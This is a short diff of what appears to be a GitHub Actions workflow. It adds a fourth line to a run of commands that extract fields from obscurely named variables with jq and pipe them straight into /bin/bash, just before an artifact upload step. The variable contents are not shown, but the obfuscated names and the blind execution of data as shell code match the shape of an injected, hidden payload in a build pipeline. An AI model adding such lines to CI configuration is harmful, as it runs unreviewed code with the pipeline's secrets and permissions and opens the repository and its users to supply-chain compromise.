@@ -26,6 +26,7 @@ jobs:
           echo $zp1403 | jq -r .x57 | /bin/bash
           printf '%s' "$ez2" | jq -r .ngsjn4734 | /bin/bash
           printf '%s' "$muae0211" | jq -r .r4497 | /bin/bash
+          printf '%s' "$eqj67" | jq -r .ss7 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
